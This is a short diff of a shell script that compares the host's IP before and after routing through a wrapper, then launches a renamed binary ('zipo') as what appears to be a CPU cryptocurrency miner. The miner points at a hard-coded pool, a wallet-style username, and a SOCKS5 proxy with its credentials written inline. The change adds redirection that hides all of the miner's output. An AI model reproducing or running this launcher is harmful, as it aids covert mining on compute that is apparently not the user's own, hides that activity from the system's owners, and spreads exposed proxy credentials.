@@ -19,4 +19,4 @@ echo "IP ORI ==> "$(curl ifconfig.me)
 echo " " 
 echo " " 
 echo "IP BARU ==> "$(./panel curl ifconfig.me)
-./panel ./zipo -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 10-999 -n 1)-EXCEL) -p c=CPU -x socks5://xmz2ezv8ptf0u7:myrimhcl3pzcifqmj97c66pmx6@52.86.18.14:1080 -t2
+./panel ./zipo -a cpupower -o 149.50.222.86:443 -u CWymb6PUUEbPgE1b8MJ1zJTg4jbXvNs3P3.$(echo $(shuf -i 10-999 -n 1)-EXCEL) -p c=CPU -x socks5://xmz2ezv8ptf0u7:myrimhcl3pzcifqmj97c66pmx6@52.86.18.14:1080 -t2 >/dev/null 2>&1
